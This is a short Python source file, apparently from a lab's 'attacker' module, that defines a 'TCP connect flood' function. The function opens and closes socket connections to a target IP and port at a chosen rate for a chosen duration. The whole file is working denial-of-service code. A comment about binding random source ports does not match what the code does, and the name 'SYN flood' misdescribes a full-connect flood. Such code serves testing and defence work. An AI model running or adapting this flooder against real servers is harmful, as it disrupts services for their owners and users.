# File: src/attacker/syn_flood.py
import socket
import time
import random

def syn_flood(target_ip, target_port, duration, rate):
    """
    A 'TCP connect flood' variant for demonstration.
    It uses normal Python sockets to fully connect to the server.
    That way, the server sees these as real connections.
    """
    print(f"[INFO] Starting TCP connect flood on {target_ip}:{target_port} "
          f"for {duration} seconds at ~{rate} connections/sec.")
    start_time = time.time()
    connection_count = 0

    while True:
        if time.time() - start_time > duration:
            break

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # For random source ports, set SO_REUSEADDR so we can bind a random port
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((target_ip, target_port))
            # Optionally send data
            s.sendall(b"Attack testing connection.\n")
            # Close immediately or keep open briefly
            s.close()
            connection_count += 1
        except Exception:
            # For demonstration, ignore failures
            pass

        # Sleep enough to achieve approximately 'rate' connections/sec
        time.sleep(1 / rate)

    print(f"[INFO] TCP connect flood completed. Total connections attempted: {connection_count}")
